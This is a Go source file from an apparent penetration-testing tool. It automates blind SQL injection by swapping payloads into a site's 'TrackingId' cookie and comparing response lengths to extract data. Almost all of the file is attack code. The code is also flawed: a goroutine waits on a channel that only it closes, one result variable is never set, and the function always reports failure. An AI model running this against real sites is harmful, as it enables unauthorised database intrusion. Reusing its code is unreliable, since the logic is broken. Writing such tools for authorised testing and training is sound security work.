package pentest

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func BlindSQLInjection(target string, ignoring bool) bool {
	if !ignoring {
		return false
	}

	fmt.Println("Ignoring non 200 HTTP Response of the target.")

	foundOrNot := false

	testPayload, testPayloadError := ReadPayload("pentest/payload/SQL/blindSQLtest.txt")
	if testPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", testPayloadError)
	}

	for _, trial := range testPayload {
		ReplaceCookieSendPost(target, trial)
	}

	authPayload, authPayloadError := ReadPayload("pentest/payload/SQL/blindSQLauth.txt")
	if authPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", authPayloadError)
	}

	charaPayload, charaPayloadError := ReadPayload("pentest/payload/characters.txt")
	if charaPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", charaPayloadError)
	}

	responseLenCh := make(chan int)
	done := make(chan struct{})
	var diffLengthTrial string
	var diffResponseLen int

	go func() {
		responseLens := make(map[int]int)
		defer close(responseLenCh)
		defer close(done)

		for _, trial := range authPayload {
			for _, ch := range charaPayload {
				replacedTrial := strings.Replace(trial, "$", ch, -1)
				go func(trial string) {
					responseLen := ReplaceCookieSendPost(target, trial)
					responseLenCh <- responseLen
				}(replacedTrial)
			}
		}

		for responseLen := range responseLenCh {
			responseLens[responseLen]++
		}

		for responseLen, count := range responseLens {
			if count == 1 {
				diffResponseLen = responseLen
				break
			}
		}
	}()

	for _, trial := range authPayload {
		for count := 0; count < diffResponseLen; count++ {
			for _, ch := range charaPayload {
				replacedTrial := strings.Replace(trial, "$", ch, -1)
				responseLen := ReplaceCookieSendPost(target, replacedTrial)
				fmt.Printf("Trial: %s, Response Length: %d\n", replacedTrial, responseLen)
			}
		}
	}

	fmt.Printf("Different Length Trial: %s, Response Length: %d\n", diffLengthTrial, diffResponseLen)

	return foundOrNot
}

func ReplaceCookieSendPost(target string, trial string) int {
	// Send the initial GET request
	response, err := http.Get(target)
	if err != nil {
		fmt.Printf("Error making GET request: %s\n", err)
		return 0
	}
	defer response.Body.Close()

	// Get the value of the "TrackingId" cookie from the response
	var updatedCookies []*http.Cookie
	for _, cookie := range response.Cookies() {
		if cookie.Name == "TrackingId" {
			updatedCookies = append(updatedCookies, &http.Cookie{
				Name:  cookie.Name,
				Value: trial,
			})
		} else {
			updatedCookies = append(updatedCookies, cookie)
		}
	}

	// Create a new request with the modified cookies
	request, err := http.NewRequest(http.MethodPost, target, nil)
	if err != nil {
		fmt.Printf("Error creating POST request: %s\n", err)
		return 0
	}

	// Set the "Cookie" header with the updated cookies
	for _, cookie := range updatedCookies {
		request.AddCookie(cookie)
	}

	// Send the POST request using the same client as the GET request
	client := &http.Client{}
	postResponse, err := client.Do(request)
	if err != nil {
		fmt.Printf("Error making POST request: %s\n", err)
		return 0
	}
	defer postResponse.Body.Close()

	// Read the response body to determine its length
	responseBody, err := ioutil.ReadAll(postResponse.Body)
	if err != nil {
		fmt.Printf("Error reading POST response body: %s\n", err)
		return 0
	}

	return len(responseBody)
}
